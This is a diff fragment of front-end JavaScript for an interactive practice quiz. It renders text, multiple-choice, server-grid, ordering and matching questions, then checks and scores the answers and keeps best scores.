+      if(C) cls = okt ? ' right' : ' wrong';
+      inner = '<input type="text" id="'+qid(p,i)+'" data-i="'+i+'" placeholder="'+q.ph+'" value="'+escT(a||'')+'"'
+        + ' autocomplete="off" spellcheck="false"'+(C?' disabled':'')+'>' + (C ? why(okt, q.show, q.w) : '');
+    } else if(q.k === 'multi'){
+      var okm = C && a.slice().sort(function(x,y){return x-y;}).join(',') === q.a.join(',');
+      if(C) cls = okm ? ' right' : ' wrong';
+      inner = '<div class="opts">' + r.perm[i].map(function(oi){
+          var on = a.indexOf(oi) >= 0, key = C && q.a.indexOf(oi) >= 0;
+          return '<label class="opt'+(key?' key':'')+'"><input type="checkbox" id="'+qid(p,i,oi)+'" data-i="'+i+'" data-o="'+oi+'"'
+               + (on?' checked':'')+(C?' disabled':'')+'><span>'+q.opt[oi]+(key?' <span class="keymark">correct choice</span>':'')+'</span></label>';
+        }).join('') + '</div>'
+        + (C ? why(okm, q.a.map(function(x){ return q.opt[x]; }).join('; '), q.w) : '');
+    } else if(q.k === 'grid'){
+      var rowsOk = q.rows.map(function(_, ri){ return q.a[ri].every(function(v, ci){ return v === a[ri][ci]; }); });
+      if(C) cls = rowsOk.every(Boolean) ? ' right' : ' mixed';
+      inner = '<div class="gridwrap"><table class="grid"><thead><tr><th>Server</th>'
+        + q.cols.map(function(c){ return '<th scope="col">'+c+'</th>'; }).join('') + '</tr></thead><tbody>'
+        + q.rows.map(function(rw, ri){
+            return '<tr'+(C?' class="'+(rowsOk[ri]?'right':'wrong')+'"':'')+'><th scope="row">'+rw+'</th>'
+              + q.cols.map(function(c, ci){
+                  return '<td><input type="checkbox" id="'+qid(p,i,ri+'-'+ci)+'" data-i="'+i+'" data-r="'+ri+'" data-c="'+ci+'"'
+                    + ' aria-label="'+rw+': '+c+'"'+(a[ri][ci]?' checked':'')+(C?' disabled':'')+'>'
+                    + (C ? '<span class="keymark">'+(q.a[ri][ci]?'meets':'fails')+'</span>' : '') + '</td>';
+                }).join('') + '</tr>';
+          }).join('') + '</tbody></table></div>'
+        + (C ? '<div class="why">' + q.rows.map(function(rw, ri){
+              return '<p class="rowwhy"><b>'+rw+' &mdash; '+(rowsOk[ri]?'correct':'check again')+'.</b> '+q.rw[ri]+'</p>'; }).join('') + '</div>' : '');
+    } else if(q.k === 'order'){
+      var ord = r.ord[i];
+      if(C) cls = ord.every(function(s, pi){ return s === q.it[pi]; }) ? ' right' : ' mixed';
+      inner = '<ol class="stages">' + ord.map(function(s, pi){
+          var lc = C ? (s === q.it[pi] ? ' class="right"' : ' class="wrong"') : '';
+          return '<li'+lc+'><span class="sname">'+s+'</span>'
+            + '<button class="move" type="button" id="'+qid(p,i,'u'+pi)+'" data-i="'+i+'" data-p="'+pi+'" data-d="-1" aria-label="Move '+s+' up"'+((C||pi===0)?' disabled':'')+'>&uarr;</button>'
+            + '<button class="move" type="button" id="'+qid(p,i,'d'+pi)+'" data-i="'+i+'" data-p="'+pi+'" data-d="1" aria-label="Move '+s+' down"'+((C||pi===ord.length-1)?' disabled':'')+'>&darr;</button></li>';
+        }).join('') + '</ol>' + (C ? '<div class="why"><b>Correct order</b>'+q.w+'</div>' : '');
+    } else if(q.k === 'match'){
+      var allOk = q.it.every(function(it, ii){ return a[ii] !== undefined && a[ii] !== '' && +a[ii] === it.a; });
+      if(C) cls = allOk ? ' right' : ' mixed';
+      inner = r.items[i].map(function(ii){
+          var it = q.it[ii], pk = a[ii], okk = pk !== undefined && pk !== '' && +pk === it.a;
+          var short = it.t.length < 40;
+          return '<div class="mitem'+(C?(okk?' right':' wrong'):'')+'">'
+            + (short ? '<p class="mt">'+it.t+'</p>' : '<p>'+it.t+'</p>')
+            + '<select id="'+qid(p,i,ii)+'" data-i="'+i+'" data-m="'+ii+'"'+(C?' disabled':'')+' aria-label="Answer for '+escT(it.t.replace(/&[a-z#0-9]+;/g,' ').slice(0,60))+'">'
+            + '<option value="">Choose&hellip;</option>'
+            + q.ch.map(function(c, ci){ return '<option value="'+ci+'"'+(String(pk)===String(ci)?' selected':'')+'>'+c+'</option>'; }).join('')
+            + '</select>' + (C ? why(okk, q.ch[it.a], it.w) : '') + '</div>';
+        }).join('');
+    }
+    h += '<div class="q'+cls+'"><p class="qp">'+q.p+'</p>'+inner+'</div>';
+  });
+  h += '<div class="btnrow">'
+     + (C ? '<button class="btn primary" type="button" id="again">Try again</button>'
+          : '<button class="btn primary" type="button" id="check">Check my answers</button>')
+     + '<span class="unans" id="unans"></span></div>'
+     + '<div class="score" id="score" aria-live="polite"></div>';
+  var pane = $('qpane');
+  pane.innerHTML = h;
+  wireQuestions(p);
+  drawScore(p);
+  if(focusSel){ var f = $(focusSel); if(f && !f.disabled) f.focus(); }
+}
+
+function wireQuestions(p){
+  var r = run(p), pane = $('qpane');
+  each(pane.querySelectorAll('select[data-i]'), function(s){
+    s.onchange = function(){
+      var i = +s.getAttribute('data-i');
+      if(s.hasAttribute('data-m')) r.ans[i][+s.getAttribute('data-m')] = s.value;
+      else r.ans[i] = s.value;
+    };
+  });
+  each(pane.querySelectorAll('input[type=text][data-i]'), function(t){
+    t.oninput = function(){ r.ans[+t.getAttribute('data-i')] = t.value; };
+    t.onkeydown = function(ev){ if(ev.key === 'Enter'){ ev.preventDefault(); } };
+  });
+  each(pane.querySelectorAll('input[type=checkbox][data-i]'), function(c){
+    c.onchange = function(){
+      var i = +c.getAttribute('data-i');
+      if(c.hasAttribute('data-o')){
+        var o = +c.getAttribute('data-o'), arr = r.ans[i], k = arr.indexOf(o);
+        if(c.checked && k < 0) arr.push(o); if(!c.checked && k >= 0) arr.splice(k, 1);
+      } else {
+        r.ans[i][+c.getAttribute('data-r')][+c.getAttribute('data-c')] = c.checked;
+      }
+    };
+  });
+  each(pane.querySelectorAll('.move'), function(b){
+    b.onclick = function(){
+      var i = +b.getAttribute('data-i'), pi = +b.getAttribute('data-p'), d = +b.getAttribute('data-d'), o = r.ord[i], j = pi + d;
+      if(j < 0 || j >= o.length) return;
+      var t = o[pi]; o[pi] = o[j]; o[j] = t;
+      drawQuestions(p, qid(p, i, (d < 0 ? 'u' : 'd') + j));
+    };
+  });
+  var c = $('check');
+  if(c) c.onclick = function(){
+    var n = unanswered(p);
+    if(n && c.getAttribute('data-confirm') !== '1'){
+      $('unans').textContent = n + (n === 1 ? ' answer is' : ' answers are') + ' still blank. Select Check again to score anyway.';
+      c.setAttribute('data-confirm', '1'); c.textContent = 'Check anyway'; return;
+    }
+    score(p); r.checked = true; drawQuestions(p); drawPicker(p.id); drawAcc();
+  };
+  var a = $('again');
+  if(a) a.onclick = function(){
+    var keep = {tab:r.tab, term:r.term, hist:r.hist, last:r.last};
+    RUN[p.id] = fresh(p); Object.keys(keep).forEach(function(k){ RUN[p.id][k] = keep[k]; });
+    drawQuestions(p);
+    var first = $('qpane').querySelector('select,input'); if(first) first.focus();
+  };
+}
+
+function score(p){
+  var m = marks(p), got = 0;
+  m.forEach(function(x){
+    if(x.ok) got++;
+    var os = st.objStats[x.o] || {c:0, t:0};
+    os.t += 1; if(x.ok) os.c += 1; st.objStats[x.o] = os;
+  });
+  var b = st.best[p.id], bg = bestGot(b);
+  if(bg === null || got > bg || b.total !== m.length) st.best[p.id] = {got:got, total:m.length};
+  run(p).last = {got:got, total:m.length};
+  save();
+}
+
+function drawScore(p){
+  var el = $('score'), b = st.best[p.id], g = bestGot(b), last = run(p).last, txt = '';
+  if(last) txt += 'This attempt: ' + last.got + ' / ' + last.total + '. ';
+  txt += (g === null) ? (p.pts + ' scored fields. Not attempted yet.') : ('Best: ' + g + ' / ' + b.total + '.');
+  el.textContent = txt;
+}
+
+drawAcc();
+var start = (location.hash || '').slice(1);
+open(BYID[start] ? start : (BYID[st.open] ? st.open : PBQS[0].id), false);
+window.addEventListener('hashchange', function(){ var h = location.hash.slice(1); if(BYID[h] && h !== CUR) open(h, true); });
 
 </script>
 </body>
